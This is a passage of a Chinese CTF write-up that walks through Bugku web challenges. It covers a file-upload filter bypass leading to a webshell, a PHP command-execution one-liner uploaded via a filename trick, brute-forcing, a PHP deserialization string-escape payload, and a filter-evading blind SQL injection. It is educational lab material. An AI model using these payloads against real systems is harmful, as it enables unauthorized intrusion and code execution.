<p>回显的也是大概就是文件的格式不合法<br>那就试一下php4、php5、php6和phtml</p>
<p><img src="https://img-blog.csdnimg.cn/20210616092406321.png" alt="在这里插入图片描述"></p>
<p>应该是有白名单</p>
<p>检查了一下发现前端没有过滤<br>那应该就是后端过滤了</p>
<p>后端的源码只有传木马后才能看到<br>但是没有后端的源码又不知道怎么改包传木马<br>那就先看后端的源码吧：</p>
<p><img src="https://img-blog.csdnimg.cn/20210616092902956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpbnRsbA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>看了源码后直接传一个jpg或者png，然后抓包</p>
<p><img src="https://img-blog.csdnimg.cn/2021061609340175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpbnRsbA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>根据后端的源码： $allowexts &#x3D; array(‘jpg’,‘gif’,‘jpeg’,‘bmp’,‘php4’);<br>应该把Content-Disposition: form-data; name&#x3D;“file”; filename&#x3D;”tx.png”</p>
<p>改为</p>
<p>Content-Disposition: form-data; name&#x3D;“file”; filename&#x3D;“tx.php4”</p>
<p>根据后端源码：if (strpos($type,“multipart&#x2F;form-data”) !&#x3D;&#x3D; False)</p>
<p>应该把Content-Type: multipart&#x2F;form-data; boundary&#x3D;—————————16288088402876089653192707327中multipart&#x2F;form-data的随便一个字母改为大写的去绕过，这里改了m为M：<br><img src="https://img-blog.csdnimg.cn/20210616093233263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpbnRsbA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>放包，有回显：</p>
<p><img src="https://img-blog.csdnimg.cn/20210616093501326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpbnRsbA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后中国蚁剑连接：</p>
<p>在根目录找到flag</p>
<p><img src="https://img-blog.csdnimg.cn/20210616094120498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpbnRsbA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="58-decrypt"><a href="#58-decrypt" class="headerlink" title="58.decrypt"></a>58.decrypt</h2><p>打开解压文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>); <span class="comment">//密钥729623334f0aa2784a1599fd374c120d</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="comment">//要加密数据长度</span></span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>); <span class="comment">//密钥长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;  <span class="comment">//以data长度循环</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>) <span class="comment">//当$x值等于密钥位数时 $x=0重新开始</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>]; <span class="comment">//字符串拼接密钥每一位</span></span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; <span class="comment">//以data长度循环</span></span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>); <span class="comment">//加密方法 将data和密钥的每一位ascii值相加后除以128得余数的值再返回为字符串拼接起来</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>])-<span class="variable">$ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>给出的加密后的数据为 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;</p>
<p>1.密钥为 $key 之位MD5加密’ISCC ‘后的 729623334f0aa2784a1599fd374c120d</p>
<p>2.$char 为32位密钥循环拼接</p>
<p>3.最后加密方法为 将data和密钥的每一位ascii值相加后除以128得余数 的值 再 返回为字符串 拼接起来</p>
<p>尝试写解密代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$base64_str</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$base64_str</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) &gt; <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) &#123;</span><br><span class="line">            <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> (<span class="number">128</span>+<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>])-<span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$str</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113150228830.png" alt="image-20221113150228830"></p>
<h2 id="59-文件包含2"><a href="#59-文件包含2" class="headerlink" title="59.文件包含2"></a>59.文件包含2</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113150709312.png" alt="image-20221113150709312"></p>
<p>修改URL</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113150800271.png" alt="image-20221113150800271"></p>
<p>创建一个文本1.php， 在里面写文件包含的话一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将文件上传并抓包，改参数content-type：image&#x2F;jpeg  filename&#x3D;”1.php:.jpg”  得到文件路径</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113151610955.png" alt="image-20221113151610955"></p>
<p>访问返回的路径，可以看到有一串字符，但可以很清晰地看到有一个 .txt文件，改参数file&#x3D;  .txt ,即可得到Flag</p>
<p><img src="https://img-blog.csdnimg.cn/20181224205740737.PNG" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/2018122420574555.PNG" alt="img"></p>
<h2 id="60-需要管理员"><a href="#60-需要管理员" class="headerlink" title="60.需要管理员"></a>60.需要管理员</h2><p>直接访问目标地址，发现是一个404页面</p>
<p><img src="https://img-blog.csdnimg.cn/7eb4868c42df499b83c9e0ebeb91fc9a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>查看源码也没有发现什么有用的提示，所以尝试爆破目录</p>
<p><img src="https://img-blog.csdnimg.cn/168825d8901340518fdf708c30e8f43b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>这里爆破出了一个robots.txt，查看一下</p>
<p><img src="https://img-blog.csdnimg.cn/b8a34697f28e408290ce0aa51bd875d5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>发现robots.txt中提示了一个php文件，尝试访问</p>
<p><img src="https://img-blog.csdnimg.cn/540af5015e064837a15d709368dcf12d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以看到在下方有一行代码，定义了一个传入的参数x，但是并没有告诉这个x应该是什么值</p>
<p>试着爆破这个值</p>
<p><img src="https://img-blog.csdnimg.cn/d71e0cea25a949629abd7c4ab802bfff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以看到当x&#x3D;admin时，应该是可以正常访问的<br>构造payload并访问：<a target="_blank" rel="noopener" href="http://114.67.246.176:16192/resusl.php?x=admin">http://114.67.246.176:16192/resusl.php?x=admin</a></p>
<p><img src="https://img-blog.csdnimg.cn/82ce3ae96e3d46b885bdec5b50833f83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS29iYWxvcyBCYWt1,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="61-newphp"><a href="#61-newphp" class="headerlink" title="61.newphp"></a>61.newphp</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113193205012.png" alt="image-20221113193205012"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113193215456.png" alt="image-20221113193215456"></p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//读取函数，我们要读取的是hint.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="variable language_">$this</span>-&gt;hint = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;hint)); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; <span class="comment">//这里只要数量的地方比标准大就过去了，这里执行反序列化时候调用</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);<span class="comment">//当读取到参数1替换成参数2</span></span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);<span class="comment">//当读取到参数二替换成参数1，因为这里如果开始就读取了write 的下面还会进行替换就回去了，所以我们就直接读二，这里进行字符串吞并</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//user类触发的payload为：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:3:&quot;111&quot;;s:8:&quot;password&quot;;s:41:&quot;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&quot;;&#125;,这里其实就是说我们理论上只能触发user类，但是我们读取的反序列化的长度是可以控制从而吞并不需要的字符串，顺便把结束的符号给吞了，规范化这个的语句就能造成读取后面的序列化数值从而造成注入，我们这里就是通过注入\0\0\0来吞掉</span></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line">payload： username=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;password=<span class="number">1</span><span class="string">&quot;;O:4:&quot;</span>evil<span class="string">&quot;:2:&#123;s:4:&quot;</span>hint<span class="string">&quot;;s:8:&quot;</span>hint.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:6:&quot;</span>tr1ple|<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:4:&quot;</span>|<span class="number">1234</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">所以我们就是要把后面的password的属性吞了剩下可以序列化，|裱起来的就是我们要吞掉的，我们不需要这些属性成立我们把它们吞掉之后剩下的是</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:3:&quot;</span><span class="number">111</span>|<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:41:&quot;</span>|O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;hint&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;hint.php&quot;</span>;&#125;<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">这些之后的属性就能够成立，成立之后我们就是给了evil类成功的属性，就能传递变量读取数值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的</span></span><br><span class="line"><span class="string">2.对类中不存在的属性也会进行反序列化</span></span><br></pre></td></tr></table></figure>

<p> PHP反序列化字符串逃逸的条件：先进行序列化，再进行字符串替换。</p>
<p><img src="https://img-blog.csdnimg.cn/eff87ca6f08e463e845926561b1de45f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rKh5LqL5bCx6YCb5Y2a5a6i,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>所以需要反序列化出一个evil()类，字符串逃逸可以</p>
<p><img src="https://img-blog.csdnimg.cn/c4ef53bb8fa24b7fb4dfaea5222b28c4.png" alt="在这里插入图片描述"></p>
<p>payload：</p>
<p><img src="https://img-blog.csdnimg.cn/e2e299f95ff2435a9fe71899881c8370.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rKh5LqL5bCx6YCb5Y2a5a6i,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/ac2545ab5da7451cbbd0a08b688ac2b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rKh5LqL5bCx6YCb5Y2a5a6i,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/bad8cd0bab3b4f7c8c1918668f06c1b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rKh5LqL5bCx6YCb5Y2a5a6i,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/a4e199dda533472ba63cca6a1514134c.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/10c30a5bfbe9453c99dc9c0ea97c77d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rKh5LqL5bCx6YCb5Y2a5a6i,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="62-点login咋没反应"><a href="#62-点login咋没反应" class="headerlink" title="62.点login咋没反应"></a>62.点login咋没反应</h2><p>打开。无法点击登录。查看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113203517346.png" alt="image-20221113203517346"></p>
<p>加到url后面看一下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113203704307.png" alt="image-20221113203704307"></p>
<p>试一下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113203752670.png" alt="image-20221113203752670"></p>
<p>cookie传值：BUGKU&#x3D;serialize(‘ctf.bugku.com’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:13:&quot;ctf.bugku.com&quot;;</span><br></pre></td></tr></table></figure>

<p>所以最终payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGKU=s:13:&quot;ctf.bugku.com&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115182452354.png" alt="image-20221115182452354"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115182512417.png" alt="image-20221115182512417"></p>
<h2 id="63-都过滤了"><a href="#63-都过滤了" class="headerlink" title="63.都过滤了"></a>63.都过滤了</h2><p>打开，SQL注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113204724018.png" alt="image-20221113204724018"></p>
<p>尝试万能密码：</p>
<p><img src="https://img-blog.csdnimg.cn/20210819052219553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU4MTg5Nzc4,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>题目提示: !,!&#x3D;,&#x3D;,+,-,^,%</p>
<p>尝试几个比较重要的，发现#、–、or、and、空格被过滤了，-、()、’、”没有被过滤</p>
<p><strong>mysql中字符串和数字类型可以比较也可以做运算，但是在比较和运算之前，字符串都会被转化成0</strong></p>
<p>select * from user where username&#x3D;’admin’-0-’‘;</p>
<p>减号的优先级高,’admin’-0-’’结果为0，实际上就是select * from user where username&#x3D;0；而我刚刚说过，字符串与数字比较会变成0，那么username&#x3D;0就是永真。我们得到的结果是密码错误</p>
<p>到现在我们可以确定了，单引号能够闭合uname这个参数存在SQL注入。</p>
<p>看看布尔注入和延时注入。</p>
<p>mid(字符串 from 起始位置 for 长度)</p>
<p>uname&#x3D;admin’-(mid((passwd)from(1))&#x3D;’a’)-‘&amp;passwd&#x3D;123</p>
<p><img src="https://img-blog.csdnimg.cn/20210819052337985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU4MTg5Nzc4,size_16,color_FFFFFF,t_70" alt="img"></p>
